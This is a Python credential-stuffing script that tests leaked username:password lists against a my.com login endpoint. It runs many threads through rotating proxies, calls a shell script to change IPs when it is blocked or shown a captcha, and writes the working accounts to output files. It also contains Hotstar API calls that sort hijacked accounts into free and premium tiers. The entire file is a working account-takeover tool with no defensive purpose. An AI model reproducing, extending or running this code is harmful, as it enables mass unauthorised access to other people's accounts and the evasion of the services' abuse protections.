import requests
import sys
import time
import datetime
import queue
import threading
import random
import subprocess
import code
import json


HEADER = '\033[95m'
OKBLUE = '\033[94m'
OKGREEN = '\033[92m'
WARNING = '\033[93m'
FAIL = '\033[91m'
ENDC = '\033[0m'
BOLD = '\033[1m'
UNDERLINE = '\033[4m'

free = 0
prem = 0
count = 1
q = queue.Queue()
lock = []
availabel = []
ip_dict = {}
thrds = 30
if (len(sys.argv) >= 3):
    thrds = int(sys.argv[3])

input_file = sys.argv[1]
output_file_free = "Valid"+datetime.datetime.now().strftime("%d-%h-%H-%M")
output_file_paid = "Valid_Premium_" + \
    datetime.datetime.now().strftime("%d-%h-%H-%M")
countFile = "."+sys.argv[0]+"_"+input_file+"_count"
proxy_file = sys.argv[2]
MAX_PROXY = 0

ua = 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Mobile Safari/537.36'
#ua='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36'


otpURL = "https://api.hotstar.com/in/aadhar/v2/web/in/user/exists"

headv1 = {
    'content-type': "application/x-www-form-urlencoded",
    'User-Agent': "MyCom/12436 CFNetwork/758.2.8 Darwin/15.0.0",
    'Accept': '*/*',
    'Accept-Language': 'en-US,en;q=0.9',
    'Accept-Encoding': 'gzip, deflate',
}

fi = open(input_file, 'r', errors='ignore')


def loadProxies():
    global MAX_PROXY
    global lock
    global availabel
    d = open(proxy_file, 'r')
    counter = 0
    for i in d.readlines():
        ip_dict[counter] = i.strip()
        lock.append(0)
        availabel.append(1)
        counter += 1
    if len(ip_dict) == 0:
        MAX_PROXY = 0
        ip_dict[counter] = ""
        lock.append(0)
        availabel.append(1)

    else:
        MAX_PROXY = len(ip_dict)-1
    print("Loaded "+str(counter)+" Proxies")


def loadQ():
    global count
    try:
        c = open(countFile, "r")
        cl = c.readline().strip()
        count = int(cl)
        for i in range(int(cl)):
            fi.readline()
    except:
        print("No Resume File Found")
    line = fi.readline()
    while len(line):
        q.put(line)
        line = fi.readline().strip()
    fi.close()


def free_ip():
    global availabel
    global ip_dict

    rand = 0
    while True:
        rand = random.randint(0, MAX_PROXY)
        if availabel[rand] == 1:
            break
    return ip_dict[rand], rand


def get_proxy():
    if MAX_PROXY == 0:
        return "", 0
    ip, container = free_ip()
    proxy = {"http": "http://"+ip,
             "https": "http://"+ip}
    return proxy, container


def countLoc():
    global count
    count = count+1
    f2 = open(countFile, 'w')
    f2.write(str(count))
    f2.close()


def writeFree(cred1):
    f1 = open(output_file_free, 'a')
    f1.write(cred1+"\n")
    f1.close()


def ban_ip(container):
    global availabel
    global ip_dict
    availabel[container] = 0
    print(ip_dict[container]+"  Blocked ")
    lock[container] += 1  # Setting Container offset
    if lock[container] == 1:
        unban_ip(container)
    else:
        print("Changing IP")


def unban_ip(container):
    print("first Thread Unblocking ")
    container_nm = str(container+1)
    print("Calling process for Container "+container_nm)

    res = subprocess.check_output(["change_tp.sh", container_nm])
    for line in res.splitlines():
        print(line)
    lock[container] = 0
    availabel[container] = 1
    print("unblocked")


def writePaid(cred1, subs):
    f1 = open(output_file_paid, 'a')
    template = cred1+" | Subscription: "+subs
    f1.write(template+"\n")
    f1.close()


def checkSub(page):
    j = json.loads(page)
    auth = j["description"]["userIdentity"]
    authUrl = "https://api.hotstar.com/in/gringotts/v2/web/in/subscription?verbose=3"
    authHead = {
        "accept": "*/*",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "en-US,en;q=0.9,hi;q=0.8",
        "content-type": "application/json",
        "userid": auth
    }
    r1 = requests.get(authUrl, headers=authHead)
    j2 = json.loads(r1.text)
    pack = j2["active_subs"]
    pack1 = len(pack)
    if(pack1 != 0):
        return pack[0]['commercial_pack']
    else:
        return "FREE"


def statusUpdate(cred, subs, container, id):
    global free
    global prem
    template = ""
    if id == 1:
        template = cred+" | Subscription: "+OKBLUE+BOLD+subs+ENDC+" | COUNTS= Total:" + \
            str(count)+" Free:"+WARNING+str(free)+ENDC+" Premium:" + \
            WARNING+str(prem)+ENDC+" ~ Proxy: "+str(ip_dict[container])
    elif id == 2:
        template = cred+" | Error: "+FAIL+BOLD+subs+ENDC+" | COUNTS= Total:" + \
            str(count)+" Free:"+WARNING+str(free)+ENDC+" Premium:" + \
            WARNING+str(prem)+ENDC+" ~ Proxy: "+str(ip_dict[container])
    print(template+" ++Running Threads = "+str(threading.active_count()))


def writeToFile(cred, subs):
    global free
    global prem
    if subs == "FREE":
        writeFree(cred)
        free += 1
    else:
        writePaid(cred, subs)
        prem += 1


def checkOTP(cred):
    un = cred.split(":")[0]
    pas = cred.split(":")[1]
    otpCheck = {"userData": {"username": un, "usertype": "email",
                             "deviceId": "DDC5A89A703B40BF5DF3BAD07EEF3B36C2A511BE"}}
    oC = requests.put(otpURL, headers=headv1, data=json.dumps(otpCheck))
    otp_res = json.loads(oC.text)
    if otp_res['description']['usertype'] == 'phone':
        return "YES"
    else:
        return "NO"


class ThreadC(threading.Thread):
    def __init__(self, q):
        threading.Thread.__init__(self)
        self.queue = q

    def run(self):
        while not q.empty():
            cred = q.get().strip()
            un = cred.split(":")[0]
            pas = cred.split(":")[1]
            r = requests.Session()
            try:
                loginURL = "https://aj-https.my.com/cgi-bin/auth?model=&simple=1&Login="+un+"&Password="+pas
                proxy, container = get_proxy()
                r.proxies = proxy
                # myusr = "vect=INTERNET&media=IOS%20TAB&portailId=OQaRQJQkSdM.&distributorId=C22021&analytics=true&trackingPub=true&email="+un+"&password="+pas
                r1 = r.get(loginURL, headers=headv1)

                print(r1.text)

                if(r1.text == "Ok=1"):
                    print(r1.text)
                    #otp = checkOTP(cred)
                    #subs = checkSub(r1.text)
                    subs = "test"
                    statusUpdate(cred, subs, container, 1)
                    writeToFile(cred, subs)
                elif "<TITLE>Access Denied</TITLE>" in r1.text:
                    statusUpdate(cred, "blocked", container, 1)
                    q.put(cred)
                    ban_ip(container)
                elif "mobile_captcha_auth=1" in r1.text:
                    statusUpdate(cred, "blocked", container, 1)
                    q.put(cred)
                    ban_ip(container)
                else:
                    statusUpdate(cred, r1.text, container, 2)
                self.queue.task_done()
                countLoc()
            except:
                print("TIMEOUT OCCURED WAITING")
                print("Unexpected error:", sys.exc_info()[1])
                time.sleep(10)
                q.put(cred)
                self.queue.task_done()


def main():
    loadQ()
    loadProxies()
    for i in range(thrds):
        t = ThreadC(q)
        t.start()
    q.join()


main()
